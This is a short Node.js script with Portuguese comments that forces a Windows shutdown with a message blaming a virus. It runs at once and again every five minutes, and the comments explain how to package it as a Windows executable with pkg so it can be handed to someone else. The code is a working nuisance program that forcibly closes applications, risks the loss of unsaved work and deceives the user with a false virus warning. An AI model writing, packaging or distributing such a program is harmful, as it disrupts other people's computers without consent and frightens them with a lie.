const child_process = require("node:child_process");

const desligarComputador = () => {
    const comandoDesligar = 'shutdown /s /f /t 10 /c "O seu computador irá desligar por conta de um vírus."'

    child_process.exec(comandoDesligar, error => {
        if (error) {
            console.error("Ocorreu um erro ao desligar o computador");
            return;
        }

        console.log("O computador está desligando...");
    });
};

desligarComputador();

const INTERVALO_TIMER = 1000 * 60 * 5; // 05 minutos

/* 
TIMER
- Um timer é uma funcionalidade que chama um função em um determinado período de tempo.
- o setInterval define um timer que irá se repetir enquanto o processo estiver ativo.

Definindo um timer que será executado a cada 05 minutos:
*/
setInterval(desligarComputador, INTERVALO_TIMER);

/* 
Para criar um executável do arquivo é necessário instalar o pacote pkg:
- npm i -g pkg
Para criar o executável do arquivo utilize o seguinte comando:
- pkg -t win nomeArquivo.js -o nomeExecutavel
*/